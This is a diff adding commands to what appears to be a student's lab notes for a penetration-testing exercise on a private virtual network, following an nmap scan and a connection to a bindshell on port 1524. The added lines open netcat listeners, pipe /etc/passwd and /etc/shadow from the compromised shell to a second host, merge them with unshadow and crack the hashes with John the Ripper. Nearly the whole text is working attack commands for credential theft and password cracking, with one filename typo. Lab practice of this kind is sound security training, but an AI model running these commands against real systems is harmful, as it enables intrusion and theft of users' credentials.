@@ -21,3 +21,16 @@ nmap -n -sU -p U:53,68,69,111,137,138,2049 192.168.56.3
 
 # Activity 5
 nc 192.168.56.3 1524
+
+nc -l -p 9899 | pv > passwd
+
+# run on the nc shell:
+# nc -w 2 192.168.56.4 9899 < /etc/passwd
+
+nc -l -p 9899 > shadow
+# run on the nc shell:
+# nc -w 2 192.168.56.4 9899 < /etc/shadow
+
+unshadow passw shadow > hashes.hash
+john --format=md5crypt-opencl hashes.hash
+john --show hashes.hash > out
